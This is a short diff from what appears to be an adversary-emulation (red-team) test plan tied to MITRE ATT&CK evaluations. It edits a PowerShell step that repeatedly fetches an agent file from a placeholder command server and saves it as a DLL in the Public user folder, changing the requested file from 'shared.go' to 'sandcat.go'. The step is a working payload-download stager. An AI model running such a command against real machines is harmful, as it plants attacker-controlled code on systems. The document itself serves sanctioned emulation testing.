@@ -14,7 +14,7 @@
           Move-Item -Force -Path .\MITRE-ATTACK-EVALS.HTML -Destination "C:\Users\#{profile_user_day2}\Documents";
           Set-Location -Path "C:\Users\#{profile_user_day2}\Desktop";
 
-          $url="#{server}/file/download"; $wc=New-Object System.Net.WebClient; $wc.Headers.add("platform","windows"); $wc.Headers.add("file","shared.go"); $wc.Headers.add("group","red-dll"); $wc.Headers.add("server","#{server}"); while($true) {try {if(($data=$wc.DownloadData($url)) -and ($name=$wc.ResponseHeaders["Content-Disposition"].Substring($wc.ResponseHeaders["Content-Disposition"].IndexOf("filename=")+9).Replace("`"","")) -and -not ([io.file]::WriteAllBytes("C:\\Users\\Public\\$name.dll",$data))) {break}} catch{sleep 60}};
+          $url="#{server}/file/download"; $wc=New-Object System.Net.WebClient; $wc.Headers.add("platform","windows"); $wc.Headers.add("file","sandcat.go"); $wc.Headers.add("group","red-dll"); $wc.Headers.add("server","#{server}"); while($true) {try {if(($data=$wc.DownloadData($url)) -and ($name=$wc.ResponseHeaders["Content-Disposition"].Substring($wc.ResponseHeaders["Content-Disposition"].IndexOf("filename=")+9).Replace("`"","")) -and -not ([io.file]::WriteAllBytes("C:\\Users\\Public\\$name.dll",$data))) {break}} catch{sleep 60}};
 
           if(Test-Path -LiteralPath "C:\Users\#{profile_user_day2}\Desktop\blob"){
             Remove-Item "C:\Users\#{profile_user_day2}\Desktop\blob" -Force;
